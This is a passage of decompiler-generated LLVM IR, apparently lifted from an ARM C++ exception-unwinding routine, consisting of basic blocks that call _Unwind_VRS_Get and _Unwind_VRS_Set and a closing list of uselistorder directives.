  %v4_18628 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 32) to i32*), align 4
  %v0_1862c = load i32, i32* %r5.global-to-local, align 4
  %v0_18630 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18630, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_18628, i32* %stack_var_-48, align 4
  %v5_18644 = call i32 @_Unwind_VRS_Set(i32 %v0_18630, i32 %v0_1862c, i32 15, i32 %v0_1862c, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1865c

dec_label_pc_18650:                               ; preds = %dec_label_pc_1859c
  %v7_18650 = icmp eq i32 %v4_18590, 2
  br i1 %v7_18650, label %dec_label_pc_18668, label %dec_label_pc_18658

dec_label_pc_18658:                               ; preds = %dec_label_pc_18650, %dec_label_pc_1873c, %dec_label_pc_185c8, %dec_label_pc_18930
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1865c

dec_label_pc_1865c:                               ; preds = %bb157, %dec_label_pc_18968, %dec_label_pc_188f8, %bb166, %dec_label_pc_185ec, %dec_label_pc_18658
  %v1_18664 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_18968 ], [ %v1_18664.pre, %dec_label_pc_188f8 ], [ 7, %bb166 ], [ 7, %dec_label_pc_185ec ], [ 9, %dec_label_pc_18658 ]
  store i32 %v3_18478, i32* %r4.global-to-local, align 4
  store i32 %v6_18478, i32* %r5.global-to-local, align 4
  ret i32 %v1_18664

dec_label_pc_18668:                               ; preds = %dec_label_pc_18650
  store i32 %v1_184a8, i32* %r2.global-to-local, align 4
  %v0_1866c = load i32, i32* @r7, align 4
  %v1_1866c = inttoptr i32 %v0_1866c to i32*
  %v2_1866c = load i32, i32* %v1_1866c, align 4
  %tmp206 = bitcast i32 %v2_1866c to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_18674 = bitcast float %tmp207 to i32
  store i32 %v1_18674, i32* @sl, align 4
  br i1 %v2_185a4, label %dec_label_pc_1867c, label %dec_label_pc_187e8

dec_label_pc_1867c:                               ; preds = %dec_label_pc_18668
  %v2_1867c = icmp eq i32 %v0_18734, 0
  br i1 %v2_1867c, label %dec_label_pc_187d0, label %dec_label_pc_18684

dec_label_pc_18684:                               ; preds = %dec_label_pc_1867c
  %v2_18688 = icmp eq i32 %v1_18674, 0
  br i1 %v2_18688, label %dec_label_pc_18694.thread, label %bb159

dec_label_pc_18694.thread:                        ; preds = %dec_label_pc_18684
  br label %dec_label_pc_188f8

bb159:                                            ; preds = %dec_label_pc_18684
  br i1 %v3_1868c, label %dec_label_pc_1869c, label %dec_label_pc_187d0

dec_label_pc_1869c:                               ; preds = %bb159
  %v1_1869c = add i32 %v0_1866c, 4
  store i32 %v1_1869c, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_186ac = load i32, i32* @r8, align 4
  %v1_186ac = add i32 %v0_186ac, 88
  store i32 %v1_186ac, i32* %sb.global-to-local, align 4
  store i32 %v1_1869c, i32* @r4, align 4
  br label %dec_label_pc_186d0

dec_label_pc_186c0:                               ; preds = %bb161
  %v1_186c0 = add i32 %v0_186c0, 1
  store i32 %v1_186c0, i32* @r5, align 4
  %v1_186c4 = load i32, i32* @sl, align 4
  %v9_186c4 = icmp eq i32 %v1_186c0, %v1_186c4
  %v0_186c8 = load i32, i32* @r4, align 4
  %v1_186c8 = add i32 %v0_186c8, 4
  store i32 %v1_186c8, i32* @r4, align 4
  br i1 %v9_186c4, label %dec_label_pc_188f8, label %dec_label_pc_186c0.dec_label_pc_186d0_crit_edge

dec_label_pc_186c0.dec_label_pc_186d0_crit_edge:  ; preds = %dec_label_pc_186c0
  %v0_186dc.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_186d0

dec_label_pc_186d0:                               ; preds = %dec_label_pc_186c0.dec_label_pc_186d0_crit_edge, %dec_label_pc_1869c
  %v0_186dc = phi i32 [ %v0_186dc.pre, %dec_label_pc_186c0.dec_label_pc_186d0_crit_edge ], [ %v1_186ac, %dec_label_pc_1869c ]
  %v1_186e0 = phi i32 [ %v1_186c8, %dec_label_pc_186c0.dec_label_pc_186d0_crit_edge ], [ %v1_1869c, %dec_label_pc_1869c ]
  %v1_186d0 = inttoptr i32 %v1_186e0 to i32*
  %v2_186d0 = load i32, i32* %v1_186d0, align 4
  %v2_186d4 = icmp eq i32 %v2_186d0, 0
  store i32 %v0_186dc, i32* %forced_unwind_-44, align 4
  br i1 %v2_186d4, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_186d0
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_186d0, %bb160
  %v0_186e4 = load i32, i32* @r8, align 4
  store i32 %v0_186e4, i32* %r0.global-to-local, align 4
  store i32 %v2_18770, i32* %r2.global-to-local, align 4
  %v4_186f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 100) to i32*), align 4
  store i32 100096, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_186f4)
  %v0_18700 = load i32, i32* %r0.global-to-local, align 4
  %v2_18700 = icmp eq i32 %v0_18700, 0
  %v0_186c0 = load i32, i32* @r5, align 4
  br i1 %v2_18700, label %dec_label_pc_186c0, label %dec_label_pc_18708

dec_label_pc_18708:                               ; preds = %bb161
  %v1_18708 = load i32, i32* @sl, align 4
  %v9_18708 = icmp eq i32 %v0_186c0, %v1_18708
  br i1 %v9_18708, label %dec_label_pc_188f8, label %dec_label_pc_18710

dec_label_pc_18710:                               ; preds = %dec_label_pc_18708
  %v0_18710 = load i32, i32* @r7, align 4
  %v1_18710 = inttoptr i32 %v0_18710 to i32*
  %v2_18710 = load i32, i32* %v1_18710, align 4
  %v1_18714 = icmp slt i32 %v2_18710, 0
  %v0_1871c.pre = load i32, i32* @r6, align 4
  br i1 %v1_18714, label %dec_label_pc_1871c, label %dec_label_pc_187dc

dec_label_pc_1871c:                               ; preds = %dec_label_pc_18710, %dec_label_pc_187d4
  %v0_1871c = phi i32 [ %storemerge, %dec_label_pc_187d4 ], [ %v0_1871c.pre, %dec_label_pc_18710 ]
  store i32 %v0_1871c, i32* %r0.global-to-local, align 4
  %v1_18720 = add i32 %v0_1871c, 4
  store i32 %v1_18720, i32* @r6, align 4
  br label %dec_label_pc_187dc

dec_label_pc_18728:                               ; preds = %bb154
  store i32 %v1_184a8, i32* %r2.global-to-local, align 4
  br i1 %v2_185a4, label %dec_label_pc_18734, label %dec_label_pc_18820

dec_label_pc_18734:                               ; preds = %dec_label_pc_18728
  %v2_18734 = icmp eq i32 %v0_18734, 0
  br i1 %v2_18734, label %dec_label_pc_187a0, label %dec_label_pc_1873c

dec_label_pc_1873c:                               ; preds = %dec_label_pc_18734
  %v0_1873c = load i32, i32* @r7, align 4
  %v1_1873c = add i32 %v0_1873c, 4
  %v2_1873c = inttoptr i32 %v1_1873c to i32*
  %v3_1873c = load i32, i32* %v2_1873c, align 4
  %v7_18740 = icmp eq i32 %v3_1873c, -2
  store i32 %v1_1873c, i32* %r2.global-to-local, align 4
  br i1 %v7_18740, label %dec_label_pc_18658, label %dec_label_pc_1874c

dec_label_pc_1874c:                               ; preds = %dec_label_pc_1873c
  %v0_1874c = load i32, i32* @r8, align 4
  %v1_1874c = add i32 %v0_1874c, 88
  %v7_18750 = icmp eq i32 %v3_1873c, -1
  store i32 %v1_1874c, i32* %forced_unwind_-44, align 4
  br i1 %v7_18750, label %dec_label_pc_18794, label %dec_label_pc_1875c

dec_label_pc_1875c:                               ; preds = %dec_label_pc_1874c
  %v2_18760 = icmp eq i32 %v3_1873c, 0
  br i1 %v2_18760, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_1875c
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_1875c, %bb162
  store i32 %v0_1874c, i32* %r0.global-to-local, align 4
  store i32 %v2_18770, i32* %r2.global-to-local, align 4
  %v4_1877c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 100) to i32*), align 4
  store i32 100232, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1877c)
  %v0_18788 = load i32, i32* %r0.global-to-local, align 4
  %v2_18788 = icmp eq i32 %v0_18788, 0
  br i1 %v2_18788, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_18794.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18794

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_187a0

dec_label_pc_18794:                               ; preds = %.thread25, %dec_label_pc_1874c
  %v3_18794 = phi i32 [ %v3_18794.pr, %.thread25 ], [ %v1_1874c, %dec_label_pc_1874c ]
  %v2_18798 = icmp eq i32 %v3_18794, 0
  br i1 %v2_18798, label %dec_label_pc_187a0, label %dec_label_pc_188f8

dec_label_pc_187a0:                               ; preds = %bb164, %dec_label_pc_1884c, %dec_label_pc_18820, %dec_label_pc_18794, %dec_label_pc_18734
  %v0_187a0 = load i32, i32* @r7, align 4
  %v1_187a0 = add i32 %v0_187a0, 8
  %v1_18508 = inttoptr i32 %v1_187a0 to i32*
  %v2_18508 = load i32, i32* %v1_18508, align 4
  %v2_1850c = icmp eq i32 %v2_18508, 0
  br i1 %v2_1850c, label %dec_label_pc_185c8, label %dec_label_pc_18514.preheader

dec_label_pc_187a8:                               ; preds = %entry
  %v3_187a8 = udiv i32 %v2_1849c, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_187b8 = mul nuw nsw i32 %v3_187a8, 4
  %v3_187bc = mul i32 %v2_1849c, 65536
  %v2_187c0 = add i32 %v6_187b8, %v4_1849c
  store i32 %v3_187bc, i32* %v4_184bc, align 8
  br label %dec_label_pc_184e4

dec_label_pc_187d0:                               ; preds = %bb159, %dec_label_pc_1867c
  %v1_187d0 = add i32 %v0_1866c, 4
  br label %dec_label_pc_187d4

dec_label_pc_187d4:                               ; preds = %dec_label_pc_18814, %dec_label_pc_187d0
  %v0_187d4 = phi i32 [ %v2_18814, %dec_label_pc_18814 ], [ %v2_1866c, %dec_label_pc_187d0 ]
  %storemerge = phi i32 [ %v4_18814, %dec_label_pc_18814 ], [ %v1_187d0, %dec_label_pc_187d0 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_187d4 = icmp slt i32 %v0_187d4, 0
  br i1 %v1_187d4, label %dec_label_pc_1871c, label %dec_label_pc_187dc

dec_label_pc_187dc:                               ; preds = %dec_label_pc_18710, %dec_label_pc_187d4, %dec_label_pc_188e8, %dec_label_pc_1871c
  %v0_187e0 = phi i32 [ %v1_18720, %dec_label_pc_1871c ], [ %storemerge, %dec_label_pc_187d4 ], [ %v1_188ec, %dec_label_pc_188e8 ], [ %v0_1871c.pre, %dec_label_pc_18710 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_1871c ], [ %stack_var_-76.2.ph3175, %dec_label_pc_187d4 ], [ %v1_188e8, %dec_label_pc_188e8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18710 ]
  %v0_187dc = load i32, i32* @sl, align 4
  %v3_187dc = mul i32 %v0_187dc, 4
  %v2_187e0 = add i32 %v3_187dc, %v0_187e0
  %v1_1850865 = inttoptr i32 %v2_187e0 to i32*
  %v2_1850866 = load i32, i32* %v1_1850865, align 4
  %v2_1850c68 = icmp eq i32 %v2_1850866, 0
  br i1 %v2_1850c68, label %dec_label_pc_185c8, label %dec_label_pc_18514.preheader.lr.ph

dec_label_pc_187e8:                               ; preds = %dec_label_pc_18668
  %v0_187f8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_187f8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18800 = load i32, i32* @r8, align 4
  %v1_18800 = add i32 %v0_18800, 32
  %v2_18800 = inttoptr i32 %v1_18800 to i32*
  %v3_18800 = load i32, i32* %v2_18800, align 4
  store i32 %v3_18800, i32* @r4, align 4
  %v5_18804 = call i32 @_Unwind_VRS_Get(i32 %v0_187f8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18804, i32* %r0.global-to-local, align 4
  %v3_18808 = load i32, i32* %stack_var_-48, align 4
  %v0_1880c = load i32, i32* @r4, align 4
  %v9_1880c = icmp eq i32 %v0_1880c, %v3_18808
  br i1 %v9_1880c, label %dec_label_pc_188b4, label %dec_label_pc_187e8.dec_label_pc_18814_crit_edge

dec_label_pc_187e8.dec_label_pc_18814_crit_edge:  ; preds = %dec_label_pc_187e8
  %v0_18814.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18814

dec_label_pc_18814:                               ; preds = %dec_label_pc_187e8.dec_label_pc_18814_crit_edge, %dec_label_pc_188b4
  %v0_18814 = phi i32 [ %v0_18814.pre, %dec_label_pc_187e8.dec_label_pc_18814_crit_edge ], [ %v1_188b8, %dec_label_pc_188b4 ]
  %v1_18814 = inttoptr i32 %v0_18814 to i32*
  %v2_18814 = load i32, i32* %v1_18814, align 4
  %v4_18814 = add i32 %v0_18814, 4
  store i32 %v4_18814, i32* @r7, align 4
  br label %dec_label_pc_187d4

dec_label_pc_18820:                               ; preds = %dec_label_pc_18728
  %v0_18830 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18830, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18838 = load i32, i32* @r8, align 4
  %v1_18838 = add i32 %v0_18838, 32
  %v2_18838 = inttoptr i32 %v1_18838 to i32*
  %v3_18838 = load i32, i32* %v2_18838, align 4
  store i32 %v3_18838, i32* @r4, align 4
  %v5_1883c = call i32 @_Unwind_VRS_Get(i32 %v0_18830, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1883c, i32* %r0.global-to-local, align 4
  %v3_18840 = load i32, i32* %stack_var_-48, align 4
  %v0_18844 = load i32, i32* @r4, align 4
  %v9_18844 = icmp eq i32 %v0_18844, %v3_18840
  br i1 %v9_18844, label %dec_label_pc_1884c, label %dec_label_pc_187a0

dec_label_pc_1884c:                               ; preds = %dec_label_pc_18820
  %v0_1884c = load i32, i32* @r8, align 4
  %v1_1884c = add i32 %v0_1884c, 40
  %v2_1884c = inttoptr i32 %v1_1884c to i32*
  %v3_1884c = load i32, i32* %v2_1884c, align 4
  %v1_18850 = load i32, i32* @r7, align 4
  %v9_18850 = icmp eq i32 %v3_1884c, %v1_18850
  br i1 %v9_18850, label %dec_label_pc_18858, label %dec_label_pc_187a0

dec_label_pc_18858:                               ; preds = %dec_label_pc_1884c
  %v1_18858 = inttoptr i32 %v3_1884c to i32*
  %v2_18858 = load i32, i32* %v1_18858, align 4
  %v1_1885c = and i32 %v2_18858, 1073741824
  %v2_1885c = icmp eq i32 %v1_1885c, 0
  br i1 %v2_1885c, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_18858
  %v2_18860 = or i32 %v2_18858, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_18858
  %tmp208 = bitcast i32 %v2_18858 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_18864 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_18868 = phi i32 [ %v2_18998, %.thread28 ], [ %v2_18998, %bb169 ], [ %v3_1884c, %bb165 ], [ %v3_1884c, %.thread26 ]
  %v0_18868 = phi i32 [ %v2_189a8, %.thread28 ], [ %v2_189a4, %bb169 ], [ %v2_18860, %bb165 ], [ %v2_18864, %.thread26 ]
  %v2_18868 = add i32 %v0_18868, %v1_18868
  store i32 %v2_18868, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18880 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18880, i32* %r0.global-to-local, align 4
  %v5_18888 = call i32 @_Unwind_VRS_Set(i32 %v0_18880, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_18880, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_188a0 = load i32, i32* @r8, align 4
  store i32 %v0_188a0, i32* %stack_var_-48, align 4
  %v5_188a8 = call i32 @_Unwind_VRS_Set(i32 %v0_18880, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1865c

dec_label_pc_188b4:                               ; preds = %dec_label_pc_187e8
  %v0_188b4 = load i32, i32* @r8, align 4
  %v1_188b4 = add i32 %v0_188b4, 40
  %v2_188b4 = inttoptr i32 %v1_188b4 to i32*
  %v3_188b4 = load i32, i32* %v2_188b4, align 4
  %v1_188b8 = load i32, i32* @r7, align 4
  %v9_188b8 = icmp eq i32 %v3_188b4, %v1_188b8
  br i1 %v9_188b8, label %dec_label_pc_188c0, label %dec_label_pc_18814

dec_label_pc_188c0:                               ; preds = %dec_label_pc_188b4
  %v1_188c4 = add i32 %v3_188b4, 4
  store i32 %v1_188c4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_188cc = add i32 %v0_188b4, 44
  %v3_188cc = inttoptr i32 %v2_188cc to i32*
  store i32 0, i32* %v3_188cc, align 4
  %v0_188d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_188d0 = load i32, i32* @r8, align 4
  %v2_188d0 = add i32 %v1_188d0, 48
  %v3_188d0 = inttoptr i32 %v2_188d0 to i32*
  store i32 %v0_188d0, i32* %v3_188d0, align 4
  %v0_188d4 = load i32, i32* @sl, align 4
  %v1_188d4 = load i32, i32* @r8, align 4
  %v2_188d4 = add i32 %v1_188d4, 40
  %v3_188d4 = inttoptr i32 %v2_188d4 to i32*
  store i32 %v0_188d4, i32* %v3_188d4, align 4
  %v0_188d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_188d8 = load i32, i32* @r8, align 4
  %v2_188d8 = add i32 %v1_188d8, 52
  %v3_188d8 = inttoptr i32 %v2_188d8 to i32*
  store i32 %v0_188d8, i32* %v3_188d8, align 4
  %v0_188dc = load i32, i32* @r7, align 4
  %v1_188dc = inttoptr i32 %v0_188dc to i32*
  %v2_188dc = load i32, i32* %v1_188dc, align 4
  %v1_188e0 = icmp slt i32 %v2_188dc, 0
  br i1 %v1_188e0, label %dec_label_pc_188e8, label %dec_label_pc_18994

dec_label_pc_188e8:                               ; preds = %dec_label_pc_188c0
  %v0_188e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_188e8 = add i32 %v0_188e8, -3
  store i32 %v1_188e8, i32* %r2.global-to-local, align 4
  %v0_188ec = load i32, i32* %r0.global-to-local, align 4
  %v1_188ec = add i32 %v0_188ec, 4
  store i32 %v1_188ec, i32* @r6, align 4
  br label %dec_label_pc_187dc

dec_label_pc_188f8:                               ; preds = %dec_label_pc_18708, %dec_label_pc_18794, %dec_label_pc_186c0, %dec_label_pc_18694.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18908 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18908, i32* %r0.global-to-local, align 4
  %v5_18910 = call i32 @_Unwind_VRS_Get(i32 %v0_18908, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_18914 = load i32, i32* @r7, align 4
  %v1_18914 = load i32, i32* @r8, align 4
  %v2_18914 = add i32 %v1_18914, 40
  %v3_18914 = inttoptr i32 %v2_18914 to i32*
  store i32 %v0_18914, i32* %v3_18914, align 4
  %v3_18918 = load i32, i32* %stack_var_-48, align 4
  %v3_1891c = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_1891c, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_18924 = load i32, i32* @r8, align 4
  %v2_18924 = add i32 %v1_18924, 32
  %v3_18924 = inttoptr i32 %v2_18924 to i32*
  store i32 %v3_18918, i32* %v3_18924, align 4
  %v0_18928 = load i32, i32* %r2.global-to-local, align 4
  %v1_18928 = load i32, i32* @r8, align 4
  %v2_18928 = add i32 %v1_18928, 36
  %v3_18928 = inttoptr i32 %v2_18928 to i32*
  store i32 %v0_18928, i32* %v3_18928, align 4
  %v1_18664.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1865c

dec_label_pc_18930:                               ; preds = %bb155
  %v1_18930 = inttoptr i32 %v0_185b8 to i32*
  %v2_18930 = load i32, i32* %v1_18930, align 4
  %v1_18934 = add i32 %v0_185b8, 4
  %v1_18938 = and i32 %v2_18930, 1073741824
  %v2_18938 = icmp eq i32 %v1_18938, 0
  %v2_1893c = or i32 %v2_18930, -2147483648
  %tmp210 = bitcast i32 %v2_18930 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_18940 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_18938, i32 %v2_18940, i32 %v2_1893c
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_18944 = load i32, i32* @r8, align 4
  %v2_18944 = add i32 %v1_18944, 56
  %v3_18944 = inttoptr i32 %v2_18944 to i32*
  store i32 %v1_18934, i32* %v3_18944, align 4
  %v0_18948 = load i32, i32* @r8, align 4
  store i32 %v0_18948, i32* %r0.global-to-local, align 4
  %v4_18954 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 28) to i32*), align 4
  store i32 100704, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18954)
  %v0_18960 = load i32, i32* %r0.global-to-local, align 4
  %v2_18960 = icmp eq i32 %v0_18960, 0
  br i1 %v2_18960, label %dec_label_pc_18658, label %dec_label_pc_18968

dec_label_pc_18968:                               ; preds = %dec_label_pc_18930
  %v0_18968 = load i32, i32* %r4.global-to-local, align 4
  %v1_18968 = load i32, i32* @r7, align 4
  %v2_18968 = add i32 %v1_18968, %v0_18968
  store i32 %v2_18968, i32* %stack_var_-48, align 4
  %v0_18978 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18978, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_18988 = call i32 @_Unwind_VRS_Set(i32 %v0_18978, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1865c

dec_label_pc_18994:                               ; preds = %dec_label_pc_188c0
  %v0_18994 = load i32, i32* @sl, align 4
  %v3_18994 = mul i32 %v0_18994, 4
  %v0_18998 = load i32, i32* %r0.global-to-local, align 4
  %v2_18998 = add i32 %v0_18998, %v3_18994
  %v3_18998 = inttoptr i32 %v2_18998 to i32*
  %v4_18998 = load i32, i32* %v3_18998, align 4
  %v1_1899c = and i32 %v4_18998, 1073741824
  %v2_1899c = icmp eq i32 %v1_1899c, 0
  br i1 %v2_1899c, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_18994
  %v2_189a4 = or i32 %v4_18998, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_18994
  %tmp212 = bitcast i32 %v4_18998 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_189a8 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_18998, { 2, 1, 0 }
  uselistorder i32 %v1_188ec, { 1, 0 }
  uselistorder i32 %v1_188e8, { 1, 0 }
  uselistorder i32 %v1_188b8, { 1, 0 }
  uselistorder i32 %v0_18880, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1884c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_18814, { 1, 0 }
  uselistorder i32 %v0_18814, { 1, 0 }
  uselistorder i32 %v2_1850866, { 1, 0 }
  uselistorder i32 %v2_187e0, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_18508, { 1, 0 }
  uselistorder i32 %v1_187a0, { 1, 0 }
  uselistorder i32 %v3_1873c, { 2, 0, 1 }
  uselistorder i32 %v0_1871c, { 1, 0 }
  uselistorder i32 %v0_1871c.pre, { 1, 0 }
  uselistorder i32 %v1_18674, { 1, 0 }
  uselistorder i32 %v2_1866c, { 1, 0 }
  uselistorder i32 %v0_185fc, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_185bc, { 1, 0 }
  uselistorder i32 %v1_185b8, { 1, 0 }
  uselistorder i32 %v0_185b8, { 1, 0, 2 }
  uselistorder i32 %v4_18590, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18734, { 1, 2, 0 }
  uselistorder i32 %v0_18568, { 1, 0 }
  uselistorder i32 %v3_18564, { 1, 0, 2 }
  uselistorder i32 %v1_18538, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_18770, { 1, 0 }
  uselistorder i1 %v2_185a4, { 1, 0, 2 }
  uselistorder i32 %v1_184a8, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 15, 16, 17, 18, 19, 20, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 20, 17, 18, 19, 24, 25, 26, 27, 29, 28, 31, 30, 32, 33, 35, 34, 23, 21, 22, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 6, 5, 9 }
  uselistorder i32 6, { 77, 0, 15, 16, 76, 4, 32, 33, 18, 28, 19, 29, 20, 30, 17, 31, 2, 34, 21, 35, 1, 5, 36, 37, 38, 6, 39, 40, 41, 42, 7, 43, 44, 45, 46, 8, 47, 9, 48, 49, 22, 50, 10, 51, 52, 53, 23, 54, 11, 55, 56, 57, 24, 58, 59, 60, 25, 61, 12, 62, 63, 64, 65, 26, 66, 13, 67, 68, 69, 70, 71, 72, 27, 73, 14, 74, 3, 75 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 23, 1, 2, 5, 12, 13, 9, 10, 11, 14, 16, 15, 6, 18, 19, 3, 20, 0, 21, 22, 7, 8, 17, 4 }
  uselistorder i32 48, { 17, 2, 0, 6, 4, 5, 9, 10, 7, 8, 14, 15, 16, 11, 12, 3, 13, 1 }
  uselistorder i32 44, { 41, 3, 42, 43, 1, 14, 4, 15, 5, 6, 7, 25, 26, 27, 28, 29, 30, 22, 23, 24, 8, 20, 21, 9, 2, 10, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 11, 12, 13, 0, 16, 17, 18, 19 }
  uselistorder i32 -2147483648, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 1073741824, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 146, 28, 29, 151, 145, 150, 30, 31, 32, 33, 34, 35, 36, 37, 144, 38, 39, 40, 2, 41, 0, 3, 42, 43, 45, 44, 1, 48, 46, 47, 49, 54, 50, 55, 51, 56, 52, 53, 57, 58, 59, 60, 62, 63, 61, 143, 65, 64, 68, 69, 70, 66, 67, 73, 71, 74, 72, 75, 76, 77, 78, 79, 81, 82, 80, 83, 147, 85, 84, 88, 89, 90, 86, 87, 91, 92, 94, 95, 96, 93, 97, 148, 98, 100, 99, 102, 101, 103, 149, 104, 106, 105, 108, 107, 110, 111, 109, 112, 113, 120, 114, 121, 115, 122, 116, 123, 117, 124, 118, 119, 126, 125, 127, 128, 129, 130, 135, 131, 136, 132, 137, 133, 134, 139, 138, 140, 141, 142 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_219f0.357 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 27, 68, 86, 69, 87, 15, 16, 70, 71, 72, 88, 17, 89, 90, 91, 18, 92, 19, 73, 93, 94, 20, 21, 22, 95, 74, 96, 23, 97, 24, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 25, 104, 105, 106, 34, 33, 35, 107, 108, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 109, 5, 110, 111, 112, 113, 114, 32, 76, 115, 81 }
  uselistorder i32 -2, { 0, 30, 31, 6, 3, 4, 2, 7, 8, 9, 1, 5, 10, 26, 25, 27, 28, 29, 18, 19, 20, 21, 22, 23, 24, 11, 12, 13, 14, 15, 16, 17 }
